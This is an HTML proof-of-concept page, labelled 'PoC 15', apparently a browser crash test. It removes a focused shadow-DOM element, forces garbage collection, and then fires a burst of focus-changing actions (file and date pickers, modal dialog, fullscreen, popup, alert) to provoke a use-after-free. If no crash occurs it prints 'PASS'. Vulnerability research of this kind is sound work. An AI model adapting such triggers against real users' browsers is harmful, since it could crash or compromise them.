<!DOCTYPE html>
<html>
<body>
<p>PoC 15 - combo máximo</p>
<div id="host"></div>
<input type="file" id="file">
<input type="date" id="date">
<dialog id="dlg">x</dialog>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

setTimeout(async () => {
    try { window.blur(); } catch(e) {}
    try { file.click(); } catch(e) {}
    try { date.click(); } catch(e) {}
    try { dlg.showModal(); setTimeout(() => dlg.close(), 50); } catch(e) {}
    try {
        if (document.documentElement.webkitRequestFullscreen)
            document.documentElement.webkitRequestFullscreen();
    } catch(e) {}
    try {
        let w = window.open('about:blank', '_blank', 'width=30,height=30');
        if (w) { w.focus(); setTimeout(() => w.close(), 40); }
    } catch(e) {}
    try { alert('final'); } catch(e) {}

    setTimeout(() => {
        result.textContent = 'PASS (não crashou)';
    }, 500);
}, 50);
</script>
</body>
</html>
